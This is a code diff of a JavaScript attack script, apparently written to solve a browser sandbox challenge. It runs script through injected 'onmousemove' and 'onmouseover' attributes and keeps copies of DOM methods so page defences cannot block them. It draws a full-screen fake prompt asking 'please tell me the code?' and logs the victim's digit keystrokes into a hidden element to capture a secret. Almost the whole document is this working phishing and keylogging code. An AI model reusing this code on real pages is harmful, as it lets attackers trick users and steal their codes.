@@ -1,5 +1,18 @@
 // API calls
 
+function saveMethods() {
+  postMessage({'setAttr': {'selector': 'html', 'name': 'onmouseover', 'value': `
+if (!window.dce) {
+  window.dce = document.createElement;
+  window.dqs = document.querySelector;
+  window.dqsa = document.querySelectorAll;
+}
+
+`}});
+  setTimeout(saveMethods, 1);
+}
+saveMethods();
+
 function read(selector) {
   postMessage({'read': {'selector': selector}});
 }
@@ -47,52 +60,37 @@ function makeId() {
   return 'x' + randRange(0, 100000000);
 }
 
-function makeDiv(attrs) {
-  var id = makeId();
+function makeDiv(id, attrs) {
   append('body', id);
+  attrs.id = id;
   setAttrs(id, attrs);
-  return id;
 }
 
 // JS execution
 
-function jsQuote(js) {
-  return '"' + js.replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\n/g, '\\n') + '"';
-}
-
 function executeJs(js) {
-  var execSel = makeDiv({
-    'style': 'position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2147483647',
-    'class': prefix
-  });
-  js += '; document.querySelector("' + execSel + '").style.display = "none";';
-  setAttr(execSel,
-          'onmousemove',
-          's = document.createElement("script"); ' +
-          's.innerHTML = ' + jsQuote(js) + '; ' +
-          'document.querySelector("body").appendChild(s)')
+  setAttr('html', 'onmousemove', js);
 }
 
 // the stuff
 
-var keyReaderSel = makeDiv({
-  'style': 'position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2147483647',
-  'class': prefix});
-
-var receiverSel = makeDiv({
-  'style': 'display: none'
-});
-
+var keyReaderSel = makeId();
+var receiverSel = makeId();
 function init() {
   executeJs(`
 
 if (!window.__prefix___init) {
+  console.log('try init');
   function randRange(low, high) {
     return Math.floor(low + Math.random() * (high - low));
   }
 
-  var k = document.querySelector('__keyReaderSel__');
-  var r = document.querySelector('__receiverSel__');
+  function makeId() {
+    return 'x' + randRange(0, 100000000);
+  }
+
+  var k = dqs.call(document, '__keyReaderSel__');
+  var r = dqs.call(document, '__receiverSel__');
 
   var kw = k.offsetWidth, kh = k.offsetHeight;
   var iw = randRange(300, 500), ih = randRange(200, 400);
@@ -101,16 +99,17 @@ if (!window.__prefix___init) {
   var html = '<div class="__prefix__" style="padding: 6px; border: 1px solid #888; border-radius: 4px; font-family: helvetica; font-size: 16px; line-height: 24px; text-align: center; position: absolute; left: ' + ix + '; top: ' + iy + '"><img class="__prefix__" src="http://placekitten.com/' + iw + '/' + ih + '"><div class="__prefix__">please tell me the code?</div><input class="__prefix__" style="font-size: 16px" size=12><input class="__prefix__" style="font-size: 16px" type=submit value="please?"><span id="__prefix___init" style="display: none">__prefix___init</span></div>';
   k.innerHTML = html;
   k.addEventListener('keyup', function(e) {
-    if (event.keyCode >= 48 && event.keyCode <= 57) {
-      r.innerText += ('' + (event.keyCode - 48));
+    console.log('keyup', e, e.keyCode);
+    if (e.keyCode >= 48 && e.keyCode <= 57) {
+      r.innerText += ('' + (e.keyCode - 48));
     }
-    if (event.keyCode == 8) {
+    if (e.keyCode == 8) {
       r.innerText = r.innerText.replace(/.$/, '');
     }
   }, true);
 
   function popInFront() {
-    var nodes = document.querySelectorAll('*');
+    var nodes = dqsa.call(document, '*');
     for (var i = 0; i < nodes.length; i++) {
       var n = nodes[i];
       var name = n.nodeName.toLowerCase();
@@ -126,6 +125,7 @@ if (!window.__prefix___init) {
   }
   popInFront();
 
+  console.log('finished init');
   window.__prefix___init = true;
 }
 
@@ -138,7 +138,16 @@ if (!window.__prefix___init) {
     setTimeout(init, 1000);
   }
 }
-setTimeout(init, 1000);
+init();
+
+makeDiv(keyReaderSel, {
+  'style': 'position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2147483647',
+  'class': prefix});
+
+makeDiv(receiverSel, {
+  'style': 'display: none'
+});
+
 
 // Capturing the secret
 
